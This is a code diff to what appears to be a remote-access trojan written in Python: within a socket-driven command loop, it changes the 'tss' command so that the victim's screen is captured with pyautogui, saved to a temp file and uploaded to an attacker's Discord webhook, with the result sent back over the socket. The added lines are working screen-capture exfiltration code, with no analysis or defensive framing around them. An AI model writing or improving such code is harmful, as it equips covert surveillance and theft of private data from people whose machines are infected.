@@ -8,6 +8,7 @@ import webbrowser
 import pyautogui
 import tempfile
 import random
+import discord_webhook
 from dotenv import load_dotenv
 from urllib.request import Request, urlopen
 
@@ -181,21 +182,19 @@ while True:
             end = str(['tss', "Unknown error occured."])
             
             screenshot = pyautogui.screenshot()
-            screenshot.save(tempfile.gettempdir() + '/abc-' + str(random.randint(0, 1000)) + ".png")
+            number = str(random.randint(0,1000))
+            directory = tempfile.gettempdir() + "/abc-" + number + ".png"
+            screenshot.save(directory)
+
+            webhook = discord_webhook.DiscordWebhook(WEBHOOK_URL)
+
+            with open(directory, "rb") as f:
+                webhook.add_file(file=f.read(), filename="screenshot.png")
+
+            response = webhook.execute()
             
-            headers = {
-                'Content-Type': 'application/json',
-                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
-            }
-            
-            payload = json.dumps({'files': screenshot})
-            
-            try:
-                req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
-                urlopen(req)
-                end = str(['tss', "Successfully sent screenshot to discord."])
-            except:
-                end = str(['tss', "Error occured."])
+            if response:
+                end = str(['tss', str(response)])
             
             end = end.encode()
             s.send(end)
